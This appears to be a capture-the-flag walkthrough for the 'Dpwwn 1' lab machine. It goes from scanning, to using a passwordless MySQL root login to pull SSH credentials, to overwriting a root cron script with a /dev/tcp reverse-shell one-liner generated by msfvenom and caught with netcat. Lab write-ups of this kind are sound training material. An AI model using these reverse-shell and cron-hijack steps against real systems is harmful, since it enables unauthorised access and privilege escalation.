# Dpwwn 1
![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/2mFxAST.png)
Victim is `192.168.227.131`
`nmap -sS -sV -A -p- -oN NmapDpwwnLv1.txt 192.168.227.131`
![](https://i.imgur.com/CbtVWI8.png)
We got ssh, web service and mysql.
![](https://i.imgur.com/w0cXN3t.png)
`dirb` it.
![](https://i.imgur.com/PcBaSGG.png)
Nothing, jsut simple info.
Let's turn to exploit the MySQL.
![](https://i.imgur.com/xfPtE3g.png)
Let's take try to access the mysql.
`mysql -h 192.168.227.131 –u root –p`
There's might be common mistake that didn't set root pf DB property.
`show databases;`
`use ssh;`
`show tables;`
![](https://i.imgur.com/4ZJn9Rl.png)
Then we found some AC/PW for SSH.
`select * from users;`
![](https://i.imgur.com/No7ipmo.png)
Then we use `mistic` to login to the machine. 
`ssh mistic@192.168.227.131`
`ls –al`
![](https://i.imgur.com/dCfEcoJ.png)
Here we got a `.sh` file belong to mistic.
`cat logrot.sh`
![](https://i.imgur.com/hx4JXBM.png)
So, this is a shell script to collect the semaphore log every 3 minutes.
`grep -r 'logrot.sh' /* 2>/dev/null`
![](https://i.imgur.com/kL8DvJa.png)
`cat /etc/crontab`
![](https://i.imgur.com/8NScdhj.png)
`msfvenom –p cmd/unix/reverse_bash lhost=192.168.227.132 lport=8888 R`
![](https://i.imgur.com/6AfEJXx.png)
`echo ‘0<&74-;exec 74<>/dev/tcp/192.168.227.132/8888;sh <&74 >&74 2>&74’ > logrot.sh`
`nc –nvlp 8888`
Wait for 3 minutes then you'll get the shell.
![](https://i.imgur.com/ngdNuAt.png)
